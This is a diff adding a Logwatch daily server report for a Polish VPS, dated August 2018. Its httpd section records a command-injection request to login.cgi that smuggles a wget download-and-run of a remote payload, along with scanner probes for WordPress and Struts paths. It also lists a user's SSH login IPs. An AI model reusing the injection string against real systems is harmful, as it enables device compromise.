@@ -1,0 +1,133 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 55D959F20297; Fri, 10 Aug 2018 03:26:06 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180810012606.55D959F20297@hrankiety.pl>
+Date: Fri, 10 Aug 2018 03:26:03 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Fri Aug 10 03:26:03 2018
+        Date Range Processed: yesterday
+                              ( 2018-Aug-09 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Thu Aug  9 03:10:10 2018
+ 
+ Last Status:
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-24823.cdiff [100%]
+    Downloading daily-24824.cdiff [100%]
+    daily.cld updated (version: 24824, sigs: 2042637, f-level: 63, builder: neo)
+    bytecode.cld is up to date (version: 326, sigs: 93, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6608979 signatures) from db.local.clamav.net (IP: 104.16.185.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 2 sites probed the server 
+    125.212.217.214
+    66.240.192.138
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 2 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://17 ... /rz;/tmp/rz%27$: 1 Time(s)
+       null: 10 Time(s)
+    404 Not Found
+       /admin/assets/js/views/login.js: 1 Time(s)
+       /blog//wp-login.php: 1 Time(s)
+       /console/integration/execute/name/GoogleSitemap: 1 Time(s)
+       /index.action: 1 Time(s)
+       /index.do: 1 Time(s)
+       /index.php: 1 Time(s)
+       /sitemap.xml: 1 Time(s)
+       /sitemap_index.xml: 1 Time(s)
+       /struts2-rest-showcase/orders.xhtml: 1 Time(s)
+       /user/register/: 1 Time(s)
+       /wp//wp-login.php: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       26   *Warning: Pre-queue content-filter connection overload 
+     6266   SASL authentication failed 
+       43   Miscellaneous warnings 
+ 
+  800.075K  Bytes accepted                           819,277
+  794.015K  Bytes delivered                          813,071
+ ========   ================================================
+ 
+       24   Accepted                                  92.31%
+        2   Rejected                                   7.69%
+ --------   ------------------------------------------------
+       26   Total                                    100.00%
+ ========   ================================================
+ 
+        2   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        2   Total Rejects                            100.00%
+ ========   ================================================
+ 
+     6318   Connections made      
+        1   Connections lost      
+     6319   Disconnections        
+       24   Removed from queue    
+       22   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+        1   SMTP protocol violations 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       89.77.72.8 (89-77-72-8.dynamic.chello.pl): 6 times
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 5 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   23G   28G  46% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
